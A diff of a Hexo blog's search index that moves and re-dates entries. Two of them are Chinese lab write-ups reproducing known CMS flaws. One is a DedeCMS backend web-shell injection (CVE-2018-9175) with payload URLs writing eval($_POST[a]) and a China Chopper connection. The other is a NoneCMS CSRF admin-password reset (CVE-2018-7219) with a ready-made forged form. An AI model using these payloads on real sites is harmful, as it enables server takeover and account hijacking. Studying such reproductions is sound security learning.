@@ -1,8 +1,69 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175)</title>
+    <url>/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
+<p>要求是做关于内网渗透，技术有限只能在末尾概述一下这个过程，文章主要讲getshell哈 ，嘻嘻嘻</p>
+<p><img src="https://github.com/xinkjung/Photos/raw/???/???.JPG" alt="wow"></p>
+<span id="more"></span>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>不多说了，直接官网下载<a href="url???pan.">Dedecms V5.7</a>放在WWW目录下，安装即可！</p>
+<p>顺带提供两个菜刀的下载目录叭 <a href="url">中国菜刀</a> 、 <a href="url">菜刀</a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>关键的来啦！来啦！注意哦！<br>（其实本人感觉这仿佛是个假洞 真的很迷。。。。。。。）</p>
+<blockquote>
+<p>查看源码，找到漏洞</p>
+</blockquote>
+<p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
+<p><img src="???url" alt="sys_1.php"></p>
+<p><img src="???url" alt="sys_2.php"></p>
+<p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
+<p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
+<p><img src="??url" alt="sys_3.php"></p>
+<blockquote>
+<p>写入SHELL并触发</p>
+</blockquote>
+<p>凑齐利用条件后，便可开始构造写入的语句啦！！！！最后的payload大概如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>
+
+<p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
+<p><img src="url" alt="1_payload"></p>
+<p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
+<p><img src="url" alt="2_inc"></p>
+<p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="url" alt="3_shell"></p>
+<blockquote>
+<p>中国菜刀添加SHELL</p>
+</blockquote>
+<p>很简单吧！嘻嘻嘻！ <img src="??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
+<p><img src="url" alt="4_caidao.1"></p>
+<p><img src="url" alt="4_caidao.2"></p>
+<p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="url" alt="bq2"></p>
+<p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
+<p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
+<p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
+<p>这时，物理机也就是攻击机就可以控制内网主机啦~~~ 大概就是这么渗透的叭 哈哈哈哈</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.源码添加代码过滤恶意标签。</p>
+<p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
+<p>3.及时打补丁，更新补丁。</p>
+<h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
+<p><img src="url" alt="bq3"></p>
+<p><a href="balabalabbbbbba....">参考链接</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>getshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>My First Blog</title>
-    <url>/2018/01/28/My-First-Blog/</url>
+    <url>/2021/07/31/My-First-Blog/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
 <ol>
 <li>全是静态文件，访问速度快；</li>
@@ -119,9 +180,37 @@ $ hexo d # == hexo deploy 上传
         <category>博客</category>
       </categories>
       <tags>
+        <tag>hexo</tag>
         <tag>blog</tag>
         <tag>github</tag>
-        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
+    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
+<span id="more"></span>
+
+<h1 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h1><p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
+<p>以修改管理员密码为例，来说明漏洞详情：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
+<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
+<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
+<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
+<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
+<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
+<p>参考链接<br><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>CSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -143,69 +232,8 @@ $ hexo d # == hexo deploy 上传
 ]]></content>
   </entry>
   <entry>
-    <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175)</title>
-    <url>/2019/01/19/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
-<p>要求是做关于内网渗透，技术有限只能在末尾概述一下这个过程，文章主要讲getshell哈 ，嘻嘻嘻</p>
-<p><img src="https://github.com/xinkjung/Photos/raw/???/???.JPG" alt="wow"></p>
-<span id="more"></span>
-
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>不多说了，直接官网下载<a href="url???pan.">Dedecms V5.7</a>放在WWW目录下，安装即可！</p>
-<p>顺带提供两个菜刀的下载目录叭 <a href="url">中国菜刀</a> 、 <a href="url">菜刀</a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>关键的来啦！来啦！注意哦！<br>（其实本人感觉这仿佛是个假洞 真的很迷。。。。。。。）</p>
-<blockquote>
-<p>查看源码，找到漏洞</p>
-</blockquote>
-<p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
-<p><img src="???url" alt="sys_1.php"></p>
-<p><img src="???url" alt="sys_2.php"></p>
-<p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
-<p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
-<p><img src="??url" alt="sys_3.php"></p>
-<blockquote>
-<p>写入SHELL并触发</p>
-</blockquote>
-<p>凑齐利用条件后，便可开始构造写入的语句啦！！！！最后的payload大概如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>
-
-<p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
-<p><img src="url" alt="1_payload"></p>
-<p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
-<p><img src="url" alt="2_inc"></p>
-<p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p><img src="url" alt="3_shell"></p>
-<blockquote>
-<p>中国菜刀添加SHELL</p>
-</blockquote>
-<p>很简单吧！嘻嘻嘻！ <img src="??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
-<p><img src="url" alt="4_caidao.1"></p>
-<p><img src="url" alt="4_caidao.2"></p>
-<p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="url" alt="bq2"></p>
-<p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
-<p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
-<p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
-<p>这时，物理机也就是攻击机就可以控制内网主机啦~~~ 大概就是这么渗透的叭 哈哈哈哈</p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.源码添加代码过滤恶意标签。</p>
-<p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
-<p>3.及时打补丁，更新补丁。</p>
-<h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
-<p><img src="url" alt="bq3"></p>
-<p><a href="balabalabbbbbba....">参考链接</a></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>getshell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Sublime text3配置PHP</title>
-    <url>/2018/01/30/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
+    <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
     <content><![CDATA[<h1 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h1><blockquote>
 <p>准备</p>
 </blockquote>
@@ -271,34 +299,6 @@ $ hexo d # == hexo deploy 上传
       <tags>
         <tag>PHP</tag>
         <tag>Sublime text3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
-    <url>/2018/08/04/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
-<span id="more"></span>
-
-<h1 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h1><p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
-<p>以修改管理员密码为例，来说明漏洞详情：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
-<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
-<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
-<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
-<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
-<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
-<p>参考链接<br><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>CSRF</tag>
       </tags>
   </entry>
 </search>
